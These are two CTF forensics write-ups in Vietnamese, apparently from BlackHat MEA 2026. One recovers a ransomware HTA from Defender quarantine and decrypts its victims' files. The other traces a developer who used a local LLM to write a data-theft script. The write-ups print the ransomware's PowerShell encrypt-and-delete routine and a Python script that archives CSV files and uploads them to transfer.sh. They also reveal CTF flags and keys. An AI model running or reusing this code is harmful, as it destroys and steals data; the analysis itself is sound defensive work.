Qfact — Forensics Write-up

Giải: BlackHat MEA Qualification CTF 2026
Category: Forensics
Flag: BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}

Đề bài

A finance employee's workstation was hit by ransomware. All documents were encrypted and a ransom note was left demanding payment in Bitcoin. The employee recalls opening a file they received via email. IT later removed some Defender exclusions during a security audit, and Defender flagged a suspicious file, but it was quarantined, not preserved on disk. A triage package has been collected. Recover the malicious file, figure out how the encryption works, and decrypt the affected files.

Ba nhiệm vụ:

  1. Khôi phục file độc hại (từ Defender Quarantine).
  2. Hiểu cơ chế mã hoá.
  3. Giải mã các file .enc.

1. Khảo sát gói triage

EncryptedFiles/     # 9 file *.enc (Financial, Personal, Projects, Reports)
EventLogs/          # *.evtx
Prefetch/           # *.pf
Quarantine/         # Defender quarantine: Entries/ ResourceData/ Resources/
Registry/           # NTUSER.DAT, SOFTWARE, SYSTEM
READ_ME.txt         # ransom note (UTF-16)

Ransom note (READ_ME.txt):

  • Đòi 0.5 BTC → bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
  • Liên hệ .onion
  • Unique ID: LOCK-DESKTOP-KLPAT9O-JM-20260628-7F3A

Unique ID có format LOCK-<COMPUTERNAME>-<2 ký tự đầu USERNAME viết hoa>-<ngày>-7F3A
→ suy ra COMPUTERNAME = DESKTOP-KLPAT9O, USERNAME bắt đầu bằng JM.

2. Khôi phục file độc hại từ Defender Quarantine

Windows Defender mã hoá file cách ly bằng RC4 với một key cứng trích từ mpengine.dll (key 256-byte công khai, bắt đầu 1E 87 78 1B 8D BA A8 44 ...). Tham khảo công cụ kinh điển defender-dump / quarantine.py.

Ba thành phần trong Quarantine/:

FileVai trò
Entries/{GUID}Metadata: threat name + đường dẫn gốc
Resources/36/<SHA1>Con trỏ tới resource
ResourceData/36/<SHA1>Bản thân file độc hại (đã mã hoá)

Giải RC4

KEY = bytes([0x1E,0x87,0x78,0x1B,0x8D,0xBA,0xA8,0x44, ...])  # 256 byte

def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xff
        S[i], S[j] = S[j], S[i]
    out = bytearray(); i = j = 0
    for b in data:
        i = (i + 1) & 0xff; j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xff])
    return bytes(out)

Entries/{GUID} — giải RC4 header 0x3C byte, đọc 2 kích thước section ở offset 0x28/0x2C, mỗi section là stream RC4 riêng:

  • Section 1 → threat name: Trojan:JS/Flafisi.C
  • Section 2 → đường dẫn gốc: C:\DevTools\Q3_Financial_Review.hta

ResourceData/36/<SHA1> — giải RC4 toàn bộ, bỏ ~212 byte header (security descriptor), phần còn lại bắt đầu bằng <html> → chính là file HTA độc hại. Lưu lại thành Q3_Financial_Review.hta.

3. Cơ chế mã hoá (phân tích HTA)

File .hta giả trang một trang "Q3 Financial Review — Loading". Trong Window_OnLoad (VBScript) nó dựng một chuỗi PowerShell rồi chạy ẩn:

' Passphrase ghép từ Chr()
k = Chr(70)&Chr(120)&Chr(55)&Chr(109)&Chr(75) _
  & Chr(57)&Chr(118)&Chr(76)&Chr(50)&Chr(110) _
  & Chr(81)&Chr(52)&Chr(119)&Chr(80)&Chr(122)&Chr(33)
' -> "Fx7mK9vL2nQ4wPz!"

PowerShell (rút gọn):

$p  = 'Fx7mK9vL2nQ4wPz!';
$d  = [Environment]::GetFolderPath('MyDocuments');
$kb = [Text.Encoding]::UTF8.GetBytes($p.PadRight(32).Substring(0,32));  # AES-256 key
$iv = [MD5]::Create().ComputeHash(
        [Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + $env:USERNAME));  # IV = MD5(host+user)

gci $d -File -Recurse | %{
    $c = [IO.File]::ReadAllBytes($_.FullName);
    $a = [Aes]::Create(); $a.Key=$kb; $a.IV=$iv; $a.Mode=0; $a.Padding=2;   # CBC + PKCS7
    $enc = $a.CreateEncryptor().TransformFinalBlock($c,0,$c.Length);
    [IO.File]::WriteAllBytes($_.FullName+'.enc', $enc);
    ri $_.FullName -Force;
}

Tóm tắt scheme:

Tham sốGiá trị
Thuật toánAES-256-CBC, PKCS7 padding
Key"Fx7mK9vL2nQ4wPz!" pad space → 32 byte
IVMD5(COMPUTERNAME + USERNAME)
Phạm viduyệt đệ quy MyDocuments, ghi .enc và xoá gốc

Sau đó nó cũng ghi ransom note và beacon IV (base64) về .onion.

4. Dựng lại IV

Cần COMPUTERNAME + USERNAME:

  • COMPUTERNAME = DESKTOP-KLPAT9O (từ ransom note Unique ID).
  • USERNAME = jmartin — lấy từ Registry/NTUSER.DAT (chuỗi C:\Users\jmartin), khớp JM trong Unique ID.
import hashlib
iv = hashlib.md5(b"DESKTOP-KLPAT9Ojmartin").digest()
# a31de3916e88f240c2bf08735b965aa9

Ghi chú: vì là CBC, đoán sai USERNAME (hoa/thường) chỉ hỏng block đầu tiên, các block sau vẫn giải đúng — hữu ích để dò khi chưa chắc casing.

5. Giải mã toàn bộ .enc

import hashlib, glob, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = "Fx7mK9vL2nQ4wPz!".ljust(32)[:32].encode()
iv  = hashlib.md5(b"DESKTOP-KLPAT9Ojmartin").digest()

for f in glob.glob("EncryptedFiles/**/*.enc", recursive=True):
    pt = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(open(f,'rb').read()), 16)
    open(f[:-4], 'wb').write(pt)

9/9 file giải ra sạch (memo, forecast, budget, vendor payments, notes, ...).

Tóm tắt kỹ thuật

Whisper — Forensics Write-up

Giải: BlackHat MEA Qualification CTF 2026
Category: Forensics
Flag: BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}

Đề bài

A company's SOC team received a proxy alert after a developer's Linux workstation attempted to upload an encrypted file to an external file-sharing service. The developer claims they were just testing an AI tool for work. A forensic triage package has been collected from the workstation. Investigate the system, determine what AI tool was installed, what it was used for, and recover the data that was attempted to be exfiltrated.

Ba nhiệm vụ:

  1. Xác định AI tool đã cài.
  2. Nó được dùng để làm gì.
  3. Khôi phục dữ liệu bị đánh cắp.

1. Khảo sát gói triage

Cấu trúc thư mục thu thập từ workstation dev-workstation (Ubuntu 24.04, VirtualBox):

data/reports/        # customers_2025.csv, employee_directory.csv, revenue_q3.csv, vendor_contracts.csv
etc/  lib/  usr/      # system
home/dwright/         # user profile
journal_exports/      # journalctl dumps
system_info/          # pip_packages, process_list, services, sockets, ...
tmp/                  # nhiều file "cache" entropy cao (decoy)

Điểm bất thường đáng chú ý ngay: cả home/dwright/.bash_history và root/.bash_history đều 0 byte — history đã bị xoá.

2. AI tool là gì? → Ollama (chứ không phải Whisper)

Tên bài "Whisper" là mồi nhử để nghĩ tới OpenAI Whisper. Bằng chứng thực sự trỏ tới Ollama:

  • journal_exports/journalctl_ollama.txt: service Ollama v0.30.8 lắng nghe trên 127.0.0.1:11434.
  • system_info/network_sockets.txt: xác nhận cổng 11434 do process ollama mở.
  • usr/share/ollama/.ollama/models/manifests/registry.ollama.ai/library/tinyllama → model đã pull là tinyllama.

Đây là một LLM chạy hoàn toàn local — đúng tinh thần của flag về sau.

3. Ollama được dùng để làm gì? → ~/.ollama/history

File home/dwright/.ollama/history (lịch sử prompt gõ vào ollama run) chứa hàng chục câu hỏi dev bình thường làm nhiễu, nhưng có một cụm liền mạch lộ rõ ý đồ:

write a python script that reads all csv files from a directory and creates an AES encrypted zip archive
use the password Gr33nF0x42!D1amond
also upload the archive to a remote server using requests and delete the script after successful execution
how do I derive an encryption key from a passphrase using hashlib sha256
how to clean the bash history in terminal so there are no traces

→ Dev đã dùng LLM local để viết mã đánh cắp dữ liệu: gom CSV → nén AES có mật khẩu → upload → xoá dấu vết. Điều này giải thích tại sao .bash_history rỗng.

Mật khẩu lộ ngay trong prompt: Gr33nF0x42!D1amond.

4. Khôi phục script exfil

Script không còn ở home, nhưng nằm trong Thùng rác của GNOME:

home/dwright/.local/share/Trash/files/cache_mgr.py
.../Trash/info/cache_mgr.py.trashinfo →

Path=/home/dwright/cache_mgr.py
DeletionDate=2026-06-16T13:02:46

Nội dung cache_mgr.py (rút gọn phần cốt lõi):

import os, sys, glob, hashlib
sys.path.insert(0, os.path.expanduser("~/.local/share/.venv/lib/python3.12/site-packages"))
import pyzipper

raw_key = os.environ.get("CACHE_KEY", "")

# KDF: KHÔNG phải sha256 như prompt hỏi, mà blake2b!
ARCHIVE_PASSWORD = hashlib.blake2b(
    raw_key.encode(), digest_size=32
).hexdigest()[:20].encode()

DATA_DIR    = "/data/reports"
CACHE_DIR   = os.path.expanduser("~/.cache/fontconfig")   # giấu output trong cache font
OUTPUT_PATH = os.path.join(CACHE_DIR, "session.zip")

def collect_and_archive():
    csv_files = glob.glob(os.path.join(DATA_DIR, "*.csv"))
    with pyzipper.AESZipFile(OUTPUT_PATH, 'w',
            compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(ARCHIVE_PASSWORD)
        for fp in csv_files:
            zf.write(fp, os.path.basename(fp))
    return OUTPUT_PATH

def upload(filepath):
    import requests
    with open(filepath, 'rb') as f:
        requests.put("https://transfer.sh/backup.zip", data=f, ...)

Những điểm quan trọng về cơ chế mã hoá:

  • Dùng pyzipper từ một venv ẩn (~/.local/share/.venv) chứ không phải môi trường thường.
  • Passphrase Gr33nF0x42!D1amond không dùng trực tiếp — nó là biến môi trường CACHE_KEY, được đưa qua KDF blake2b(digest_size=32).hexdigest()[:20].
  • Archive được giấu tại ~/.cache/fontconfig/session.zip — thư mục cache font, nơi ít ai để ý.
  • Đích upload: https://transfer.sh/backup.zip.

5. Giải mã archive

Tìm được archive thật tại home/dwright/.cache/fontconfig/session.zip. Tái tạo mật khẩu bằng đúng KDF trong script:

import hashlib, pyzipper
raw = "Gr33nF0x42!D1amond"
pw = hashlib.blake2b(raw.encode(), digest_size=32).hexdigest()[:20].encode()
# -> d571fe77618f54b7fca8

with pyzipper.AESZipFile('session.zip') as zf:
    zf.setpassword(pw)
    zf.extractall('out')

Ghi chú / bẫy trong bài

  • Tên bài "Whisper" đánh lạc hướng sang OpenAI Whisper (speech-to-text). AI tool thật là Ollama.
  • Toàn bộ file trong /tmp (.config_backup_old.tar.gz, journal-upload.tmp, .mozilla_cache.dat, core.python3.*, …) có entropy ~8.0 nhưng chỉ là random bytes — decoy thuần, không giải mã ra gì.
  • KDF là blake2b, không phải sha256 như prompt gợi ý — bám theo prompt sẽ ra sai key.
  • Manh mối trải rộng: .ollama/history (ý đồ + mật khẩu) → Trash (script) → .cache/fontconfig (archive) → base64 trong CSV (flag).
